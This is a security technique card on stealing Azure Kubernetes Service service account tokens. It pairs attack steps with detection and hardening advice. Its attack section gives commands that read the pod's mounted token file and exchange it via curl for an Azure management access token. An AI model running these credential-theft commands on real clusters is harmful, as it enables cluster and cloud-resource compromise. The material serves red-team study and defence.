# [CA-TOKEN-013]: AKS Service Account Token Theft

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-013 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Authentication Certificates (T1528)](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure Kubernetes Service (AKS) |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Every Pod in Kubernetes is automatically mounted with a Service Account (SA) token at `/var/run/secrets/kubernetes.io/serviceaccount/token`. If an attacker compromises a container, they can steal this JWT. In AKS, if the cluster is not RBAC-hardened, this token might have cluster-wide permissions. Furthermore, if **Workload Identity** is enabled, this token can be exchanged for an Entra ID Access Token to access Azure resources (Key Vault, SQL).
- **Attack Surface:** Container Filesystem.
- **Business Impact:** **Cluster & Cloud Compromise**. Escaping the container to control the cluster or pivoting to Azure resources.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Shell access inside a Pod.
- **Tools:** `cat`, `curl`, `kubectl`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Extract K8s Token**
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Step 2: Exchange for Azure Token (Workload Identity)**
If the pod is configured with Workload Identity:
```bash
# 1. Get OIDC Token (SA Token)
export AZURE_FEDERATED_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# 2. Exchange for Access Token
curl -X POST -d "grant_type=client_credentials&client_id=$AZURE_CLIENT_ID&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$AZURE_FEDERATED_TOKEN&resource=https://management.azure.com/" https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/token
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 AKS Audit Logs
| Source | Event | Filter Logic |
|---|---|---|
| **KubeAudit** | `SelfSubjectAccessReview` | A Pod querying its own permissions (often done by attackers after stealing a token). |
| **Entra ID** | `ServicePrincipal` | Sign-in from an AKS IP range using a Federated Credential (Workload Identity) but accessing sensitive resources unexpectedly.

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Least Privilege:** Ensure Service Accounts have minimal RBAC rights. Use specific SAs for each workload, not the `default` SA.
*   **Disable Automount:** Set `automountServiceAccountToken: false` in Pod specs if the pod doesn't need to talk to the API server.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-003] (Container Compromise)
> **Next Logical Step:** [LAT-CLOUD-001]
